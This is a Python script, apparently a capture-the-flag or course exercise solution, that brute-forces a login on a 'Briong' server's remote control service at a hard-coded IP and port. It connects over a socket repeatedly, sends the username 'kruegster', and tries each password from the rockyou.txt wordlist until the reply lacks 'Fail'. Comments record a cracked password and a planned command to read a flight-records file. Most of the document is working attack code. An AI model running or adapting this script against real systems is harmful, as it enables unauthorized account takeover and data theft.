"""
    If you know the IP address of the Briong server and you
    know the port number of the service you are trying to connect
    to, you can use nc or telnet in your Linux terminal to interface
    with the server. To do so, run:

        $ nc <ip address here> <port here>

    In the above the example, the $-sign represents the shell, nc is the command
    you run to establish a connection with the server using an explicit IP address
    and port number.

    If you have the discovered the IP address and port number, you should discover
    that there is a remote control service behind a certain port. You will know you
    have discovered the correct port if you are greeted with a login prompt when you
    nc to the server.

    In this Python script, we are mimicking the same behavior of nc'ing to the remote
    control service, however we do so in an automated fashion. This is because it is
    beneficial to script the process of attempting multiple login attempts, hoping that
    one of our guesses logs us (the attacker) into the Briong server.

    Feel free to optimize the code (ie. multithreading, etc) if you feel it is necessary.

"""

import socket

host = "142.93.117.193" # IP address of admin page
port = 1337 

wordlist = "/Users/Anand/Downloads/rockyou.txt" # Point to wordlist file I downloaded because I screw VMware


def brute_force():
   # username = "kruegster"   
   # password = "pokemon"
   #      .---.
   #    /     \
   #    \.@-@./
   #    /`\_/`\
   #   //  _  \\
   #  | \     )|_
   # /`\_`>  <_/ \
   # \__/'---'\__/
   # I was trying to figure out what Briong was for the longest time before I realized its probably from last year.

    with open(wordlist) as f:
        
        content = f.readlines()
        
        for line in content:
            # if backended implemented a retry feature this would be so much nicer than opening a new connection every time
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            print("Password: " + line)
                
            # send user name - guessed correctly on first try!
            data = s.recv(1024)
            s.send("kruegster\n")

            # send password
            data = s.recv(1024)
            s.send(line)
            data = s.recv(1024)
            print(data)

            # nothing fancy just stop when you find the password
            if "Fail" not in data:
                print(line)
                break

        # I could probably do something like s.send("cat /home/flight_records/AAC27670.txt") but I'll just do it manually

if __name__ == '__main__':
    brute_force()
